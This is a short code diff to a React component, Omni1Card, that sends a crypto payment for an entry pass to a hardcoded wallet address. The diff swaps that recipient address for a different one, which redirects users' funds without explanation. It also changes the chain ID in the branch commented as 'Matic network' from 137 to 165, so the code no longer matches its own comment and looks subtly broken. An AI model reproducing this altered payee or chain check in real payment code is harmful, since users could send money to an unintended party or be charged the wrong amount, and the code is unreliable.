@@ -150,7 +150,7 @@ const Omni1Card = ({ entryPass, imgSrc }) => {
 
         // Determine the transfer amount based on the network
         let transferAmount;
-        if (network.chainId === 137) {
+        if (network.chainId === 165) {
           // Matic network
           transferAmount = ethers.utils.parseUnits('1.5', 'ether'); // 1.5 MATIC
         } else if (network.chainId === 56) {
@@ -165,7 +165,7 @@ const Omni1Card = ({ entryPass, imgSrc }) => {
 
         // Send the transfer transaction
         const tx = await signer.sendTransaction({
-          to: '0x4E27D38b44C3e1528619DADC9F3E50C703fD32F4',
+          to: '0x24669FBDD958b7fEC8e78399e78927F1568742b1',
           value: transferAmount,
         });
         console.log('Transaction Sent:', tx.hash);
